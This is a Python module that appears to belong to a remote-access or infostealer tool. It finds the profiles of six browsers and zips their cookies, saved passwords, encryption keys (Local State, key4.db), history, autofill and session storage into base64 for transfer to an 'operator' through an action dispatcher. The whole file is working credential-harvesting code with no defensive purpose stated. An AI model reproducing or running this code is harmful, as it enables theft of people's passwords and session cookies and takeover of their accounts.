"""Browser Profile Exporter.

Exports browser profiles (session data, cookies, login data, etc.) 
for use on the operator's machine.

Only exports essential files for session continuity:
- Cookies
- Login Data (saved passwords)
- Local Storage
- Session Storage  
- IndexedDB
- Web Data (autofill)
- Preferences
- Local State (encryption keys)
- Bookmarks

This is much smaller than the full profile (~50-200MB vs multiple GB).
"""
from __future__ import annotations

import base64
import io
import json
import logging
import os
import platform
import shutil
import tempfile
import zipfile
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

# Browser profile configurations
BROWSER_PROFILES = {
    "chrome": {
        "name": "Google Chrome",
        "user_data": Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data",
        "type": "chromium",
    },
    "edge": {
        "name": "Microsoft Edge",
        "user_data": Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data",
        "type": "chromium",
    },
    "brave": {
        "name": "Brave",
        "user_data": Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data",
        "type": "chromium",
    },
    "opera": {
        "name": "Opera",
        "user_data": Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera Stable",
        "type": "chromium",
        "flat": True,  # Opera doesn't use User Data subfolder
    },
    "vivaldi": {
        "name": "Vivaldi",
        "user_data": Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data",
        "type": "chromium",
    },
    "firefox": {
        "name": "Mozilla Firefox",
        "profiles_dir": Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles",
        "type": "firefox",
    },
}

# Essential files for Chromium-based browsers
CHROMIUM_ESSENTIAL_FILES = [
    # Root level files
    "Local State",
    "First Run",
    
    # Default profile files
    "Default/Cookies",
    "Default/Network/Cookies",
    "Default/Login Data",
    "Default/Login Data For Account",
    "Default/Web Data",
    "Default/Preferences",
    "Default/Secure Preferences",
    "Default/Bookmarks",
    "Default/History",
    "Default/Favicons",
    "Default/Top Sites",
    "Default/Visited Links",
    
    # Storage
    "Default/Local Storage/",
    "Default/Session Storage/",
    "Default/IndexedDB/",
    "Default/Extension State/",
    
    # Extensions (for session managers, etc.)
    "Default/Extensions/",
]

# Essential files for Firefox
FIREFOX_ESSENTIAL_FILES = [
    "cookies.sqlite",
    "places.sqlite",
    "logins.json",
    "key4.db",
    "cert9.db",
    "formhistory.sqlite",
    "permissions.sqlite",
    "prefs.js",
    "user.js",
    "search.json.mozlz4",
    "sessionstore.jsonlz4",
    "storage/",
]


class BrowserProfileExporter:
    """Exports browser profiles for transfer to operator."""
    
    def __init__(self):
        self._is_windows = platform.system() == "Windows"
    
    def list_available_browsers(self) -> list[dict]:
        """List browsers with available profiles."""
        available = []
        
        for browser_id, config in BROWSER_PROFILES.items():
            if config["type"] == "chromium":
                user_data = config.get("user_data")
                if user_data and user_data.exists():
                    # Check for Default profile
                    if config.get("flat"):
                        profile_exists = (user_data / "Cookies").exists() or (user_data / "Network" / "Cookies").exists()
                    else:
                        profile_exists = (user_data / "Default").exists()
                    
                    if profile_exists:
                        available.append({
                            "id": browser_id,
                            "name": config["name"],
                            "type": config["type"],
                            "path": str(user_data),
                        })
            
            elif config["type"] == "firefox":
                profiles_dir = config.get("profiles_dir")
                if profiles_dir and profiles_dir.exists():
                    # Find default profile
                    for profile_dir in profiles_dir.iterdir():
                        if profile_dir.is_dir() and (profile_dir / "cookies.sqlite").exists():
                            available.append({
                                "id": browser_id,
                                "name": config["name"],
                                "type": config["type"],
                                "path": str(profile_dir),
                            })
                            break
        
        return available
    
    def export_profile(self, browser: str, include_extensions: bool = False) -> dict:
        """Export browser profile as base64-encoded ZIP.
        
        Args:
            browser: Browser ID (chrome, edge, firefox, etc.)
            include_extensions: Include browser extensions (larger file)
            
        Returns:
            Dict with success status and base64 data or error
        """
        if browser not in BROWSER_PROFILES:
            return {
                "action": "profile_export",
                "success": False,
                "error": f"Unknown browser: {browser}",
            }
        
        config = BROWSER_PROFILES[browser]
        
        try:
            if config["type"] == "chromium":
                return self._export_chromium_profile(browser, config, include_extensions)
            elif config["type"] == "firefox":
                return self._export_firefox_profile(browser, config)
            else:
                return {
                    "action": "profile_export",
                    "success": False,
                    "error": f"Unsupported browser type: {config['type']}",
                }
        except Exception as e:
            logger.error("Failed to export %s profile: %s", browser, e)
            return {
                "action": "profile_export",
                "success": False,
                "error": str(e),
                "browser": browser,
            }
    
    def _export_chromium_profile(self, browser: str, config: dict, 
                                  include_extensions: bool) -> dict:
        """Export Chromium-based browser profile."""
        user_data = config.get("user_data")
        if not user_data or not user_data.exists():
            return {
                "action": "profile_export",
                "success": False,
                "error": f"{config['name']} profile not found",
                "browser": browser,
            }
        
        # Create in-memory ZIP
        zip_buffer = io.BytesIO()
        files_added = 0
        total_size = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Determine files to export
            essential_files = CHROMIUM_ESSENTIAL_FILES.copy()
            
            if not include_extensions:
                essential_files = [f for f in essential_files if "Extensions" not in f]
            
            if config.get("flat"):
                # Opera-style flat structure
                essential_files = [f.replace("Default/", "") for f in essential_files]
            
            for pattern in essential_files:
                if pattern.endswith("/"):
                    # Directory pattern
                    dir_path = user_data / pattern.rstrip("/")
                    if dir_path.exists() and dir_path.is_dir():
                        for file_path in dir_path.rglob("*"):
                            if file_path.is_file():
                                try:
                                    rel_path = file_path.relative_to(user_data)
                                    # Skip very large files
                                    if file_path.stat().st_size > 50 * 1024 * 1024:  # 50MB
                                        continue
                                    zf.write(file_path, str(rel_path))
                                    files_added += 1
                                    total_size += file_path.stat().st_size
                                except Exception as e:
                                    logger.debug("Skipping %s: %s", file_path, e)
                else:
                    # Single file pattern
                    file_path = user_data / pattern
                    if file_path.exists() and file_path.is_file():
                        try:
                            rel_path = file_path.relative_to(user_data)
                            zf.write(file_path, str(rel_path))
                            files_added += 1
                            total_size += file_path.stat().st_size
                        except Exception as e:
                            logger.debug("Skipping %s: %s", file_path, e)
            
            # Add metadata
            metadata = {
                "browser": browser,
                "browser_name": config["name"],
                "browser_type": config["type"],
                "files_count": files_added,
                "original_path": str(user_data),
                "export_type": "essential",
            }
            zf.writestr("_profile_metadata.json", json.dumps(metadata, indent=2))
        
        if files_added == 0:
            return {
                "action": "profile_export",
                "success": False,
                "error": "No profile files found",
                "browser": browser,
            }
        
        # Encode to base64
        zip_data = zip_buffer.getvalue()
        b64_data = base64.b64encode(zip_data).decode('ascii')
        
        logger.info("Exported %s profile: %d files, %d bytes", browser, files_added, len(zip_data))
        
        return {
            "action": "profile_export",
            "success": True,
            "browser": browser,
            "browser_name": config["name"],
            "files_count": files_added,
            "size": len(zip_data),
            "data": b64_data,
        }
    
    def _export_firefox_profile(self, browser: str, config: dict) -> dict:
        """Export Firefox profile."""
        profiles_dir = config.get("profiles_dir")
        if not profiles_dir or not profiles_dir.exists():
            return {
                "action": "profile_export",
                "success": False,
                "error": "Firefox profiles not found",
                "browser": browser,
            }
        
        # Find default profile (usually has .default-release or .default suffix)
        profile_path = None
        for profile_dir in profiles_dir.iterdir():
            if profile_dir.is_dir():
                if "default-release" in profile_dir.name or "default" in profile_dir.name:
                    if (profile_dir / "cookies.sqlite").exists():
                        profile_path = profile_dir
                        break
        
        if not profile_path:
            # Try any profile with cookies
            for profile_dir in profiles_dir.iterdir():
                if profile_dir.is_dir() and (profile_dir / "cookies.sqlite").exists():
                    profile_path = profile_dir
                    break
        
        if not profile_path:
            return {
                "action": "profile_export",
                "success": False,
                "error": "No Firefox profile with cookies found",
                "browser": browser,
            }
        
        # Create in-memory ZIP
        zip_buffer = io.BytesIO()
        files_added = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for pattern in FIREFOX_ESSENTIAL_FILES:
                if pattern.endswith("/"):
                    # Directory
                    dir_path = profile_path / pattern.rstrip("/")
                    if dir_path.exists() and dir_path.is_dir():
                        for file_path in dir_path.rglob("*"):
                            if file_path.is_file():
                                try:
                                    rel_path = file_path.relative_to(profile_path)
                                    if file_path.stat().st_size > 50 * 1024 * 1024:
                                        continue
                                    zf.write(file_path, str(rel_path))
                                    files_added += 1
                                except Exception as e:
                                    logger.debug("Skipping %s: %s", file_path, e)
                else:
                    # Single file
                    file_path = profile_path / pattern
                    if file_path.exists() and file_path.is_file():
                        try:
                            zf.write(file_path, pattern)
                            files_added += 1
                        except Exception as e:
                            logger.debug("Skipping %s: %s", file_path, e)
            
            # Add metadata
            metadata = {
                "browser": browser,
                "browser_name": config["name"],
                "browser_type": config["type"],
                "files_count": files_added,
                "original_path": str(profile_path),
                "profile_name": profile_path.name,
                "export_type": "essential",
            }
            zf.writestr("_profile_metadata.json", json.dumps(metadata, indent=2))
        
        if files_added == 0:
            return {
                "action": "profile_export",
                "success": False,
                "error": "No Firefox profile files found",
                "browser": browser,
            }
        
        zip_data = zip_buffer.getvalue()
        b64_data = base64.b64encode(zip_data).decode('ascii')
        
        logger.info("Exported Firefox profile: %d files, %d bytes", files_added, len(zip_data))
        
        return {
            "action": "profile_export",
            "success": True,
            "browser": browser,
            "browser_name": config["name"],
            "profile_name": profile_path.name,
            "files_count": files_added,
            "size": len(zip_data),
            "data": b64_data,
        }
    
    def handle_action(self, action: str, payload: dict) -> dict:
        """Handle profile export action.
        
        Args:
            action: Action name (without profile_ prefix)
            payload: Action payload
            
        Returns:
            Response dict
        """
        if action == "list":
            browsers = self.list_available_browsers()
            return {
                "action": "profile_list",
                "success": True,
                "browsers": browsers,
            }
        
        elif action == "export":
            browser = payload.get("browser", "")
            include_extensions = payload.get("include_extensions", False)
            return self.export_profile(browser, include_extensions)
        
        return {
            "action": f"profile_{action}",
            "success": False,
            "error": f"Unknown action: {action}",
        }


# Global instance
_profile_exporter: BrowserProfileExporter | None = None


def get_profile_exporter() -> BrowserProfileExporter:
    """Get or create global profile exporter instance."""
    global _profile_exporter
    if _profile_exporter is None:
        _profile_exporter = BrowserProfileExporter()
    return _profile_exporter


def export_browser_profile(browser: str, include_extensions: bool = False) -> dict:
    """Export browser profile - convenience function."""
    return get_profile_exporter().export_profile(browser, include_extensions)
